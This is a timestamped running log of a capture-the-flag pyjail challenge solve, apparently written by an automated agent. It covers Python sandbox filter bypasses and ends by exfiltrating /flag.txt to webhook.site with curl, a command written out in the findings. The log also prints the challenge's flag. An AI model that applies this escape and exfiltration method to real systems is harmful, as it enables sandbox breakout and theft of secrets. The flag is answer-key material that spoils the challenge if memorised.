# The pyjail

**Flag:** `TFCCTF{i_hope_this_is_not_the_last_jail}`

# The pyjail — running log

Append-only. Timestamp every entry.

## Hypotheses
## Findings
## Dead ends
## Limitations
## Next actions

## Findings
- 2026-09-05T13:25:51Z Unpacked jail.zip: jail.py, run.sh, Dockerfile (python:3.15-rc-slim). Flag at /flag.txt, chmod 400.
- 2026-09-05T13:25:51Z jail.py accepts TCP on 1234, reads user_input until line END, writes static user.py that filters input to chars in "abcdefghijklmnopqrstuvwxyz:_.[]," then rejects code containing 'ass'/'typ'/'als' and evals it with globals {"__builtins__": {"idk":idk,"sys":sys}}.
- 2026-09-05T13:25:51Z user.py runs via os.system("python3 user.py") as a child process; its stdout/stderr go to container console, NOT the client socket. Exfiltration likely must write to the inherited client socket fd (probably /proc/self/fd/N).
- 2026-09-05T13:25:51Z No parens/quotes/digits/spaces/operators. Expression-only eval.
- 2026-09-05T13:25:51Z Known pyjail trick (jailctf-2025-impossible writeup): no-space list-comprehension assignment `[[]for[a]in[[b]]]` binds a=b; set `obj.__class__.__getitem__`/`__getattr__` to a callable, then `obj[arg]`/`obj.attr` calls it. Our filter blocks `__class__` (contains 'ass') and `type` (contains 'typ').
- 2026-09-05T13:25:51Z Reachable class objects without `__class__`: `idk.__call__.__objclass__` -> class 'function'; `sys.__getattribute__.__objclass__` -> class 'module'. But function/module types are immutable: cannot set __getitem__/__getattr__ on them (TypeError).
- 2026-09-05T13:25:51Z Need a mutable Python-defined class instance (e.g. site._Printer `copyright`/`credits`/`license`, `help`, `quit`). They live in `idk.__builtins__` (full builtins dict) but need a string key.
- 2026-09-05T13:25:51Z idk.__builtins__ is full builtins dict (name passes filter). idk.__globals__ is user.py globals.

## Findings
- 2026-09-05T14:26:08Z Python 3.15.0rc1 installed locally via uv for exact simulation. Confirmed jail runs user.py via os.system, so the client socket (fd 4 in jail.py) is NOT inherited (PEP 446 CLOEXEC). Direct os.write(4,...) fails.
- 2026-09-05T14:26:08Z Discovered no-parens call primitive: set `FileFinder.__getitem__` (class obtained via `sys.path_hooks[1].__closure__[0].cell_contents`) using no-space comprehension assignment `[[]for[target]in[[value]]]`, then subscript a FileFinder instance (`sys.path_importer_cache[sys.path[2]]`) to call builtins/bound methods with one argument.
- 2026-09-05T14:26:08Z String building: set `FileFinder.__getitem__=sys.__package__.join` (empty-string join) to concatenate arbitrary strings from per-char slice expressions. Built a generator that maps every needed char to a stable Python 3.15 expression.
- 2026-09-05T14:26:08Z Full exec payload works locally end-to-end and writes flag to an inherited socket fd (simulated); but on remote the fd is not inherited. Exfil options: pidfd_getfd (needs ptrace) or outbound curl (container has internet).
- 2026-09-05T14:26:08Z Remote curl test SUCCEEDED: webhook.site received GET from container (curl 8.14.1). So join/exec machinery works on remote; pidfd approach was the failing part.
- 2026-09-05T14:26:08Z Built payload_curl_flag.txt that reads /flag.txt and POSTs it via curl to webhook.site token ba9c7f77-2af6-45f8-be19-33803c4bff5a. Need a running instance slot to send it.
## Next actions
- 2026-09-05T14:26:08Z Wait for a free instance slot, start python-jail, send payload_curl_flag.txt, read flag from webhook, submit.

## Findings
- 2026-09-05T14:31:15Z SOLVED. Flag: TFCCTF{i_hope_this_is_not_the_last_jail}
- 2026-09-05T14:31:15Z Robust exfil: read /flag.txt, strip whitespace, run `curl -s -d <flag> https://webhook.site/<uuid>` via os.system inside the exec payload. Container has outbound internet (curl 8.14.1).
- 2026-09-05T14:31:15Z Submitted via CTFClient.submit_flag -> {"ok": true} (flag_id c820235b-39ae-4dca-9a1f-aa79088453ae).
- 2026-09-05T14:31:15Z Wrote flag.txt in challenge folder.
## Dead ends
- 2026-09-05T14:31:15Z D1: writing directly to fd 4 in user.py fails (socket fd is non-inheritable across os.system; PEP 446 CLOEXEC).
- 2026-09-05T14:31:15Z D2: pidfd_getfd exfil payload produced no flag on remote (likely pidfd_getfd blocked or fd mismatch); curl exfil worked instead.
## Limitations
- 2026-09-05T14:31:15Z webhook.site token is temporary; flag was read from the POST body and submitted successfully.
